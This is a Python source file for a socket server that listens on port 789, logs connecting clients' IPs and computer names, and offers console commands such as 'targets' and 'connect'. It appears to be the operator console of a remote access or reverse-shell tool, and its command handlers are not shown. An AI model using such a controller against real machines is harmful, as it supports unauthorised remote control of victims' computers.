import socket
import time
import threading
import sys
import utils
import constants

from .cmd_controllers.pre_client_conn.controller import Pre_Client_Cmd_Controller

from .misc.controller import Misc_Controller


class server:
    conn_list = {}
    client_details = {}

    # commands
    pre_conn_cmds = constants.PRE_CONN_CMDS
    conn_cmds = constants.POST_CONN_CMDS

    is_conn_established = False
    connected_client = ""

    default_text = constants.DEFAULT_TEXT

    def __init__(self):
        # welcome
        print("Type help for displaying commands...")
        print("\n")

        self.create_and_init_socket()

        self.accept_user_input()

    def accept_user_input(self):
        while True:

            print(self.default_text, end="")
            get_cmd_input = input("")

            if get_cmd_input == "help":
                Pre_Client_Cmd_Controller.help()

            elif get_cmd_input[:7] == "connect":
                client_uid = get_cmd_input[8:]
                Pre_Client_Cmd_Controller.connect_to_client(self, client_uid)

            elif get_cmd_input == "port":
                print(constants.PORT)

            elif get_cmd_input == "targets":
                Pre_Client_Cmd_Controller.get_targets(self)

            elif get_cmd_input == "exit":
                sys.exit()

            else:
                print("Not a command")

            print("\n")

    def create_and_init_socket(self):
        # creating the socket
        self.sock_create()

        # thread for accepting connections
        self.acc_thread = threading.Thread(target=self.sock_accept)
        self.acc_thread.daemon = True
        self.acc_thread.start()

        # thread for checking connections
        self.check_conn_thread = threading.Thread(
            target=Misc_Controller.check_conn, args=(self,)
        )
        self.check_conn_thread.daemon = True
        self.check_conn_thread.start()

    def sock_accept(self):
        while True:
            c, (ip, port) = self.sock.accept()
            comp_name = c.recv(2048).decode()
            client_uid = utils.gen_rand_str(6)
            self.conn_list[client_uid] = c
            self.client_details[client_uid] = {
                "ip": ip,
                "port": port,
                "name": str(comp_name),
            }

    def sock_create(self):
        self.sock = socket.socket()
        self.sock.bind(("0.0.0.0", 789))

        self.sock.listen(1)
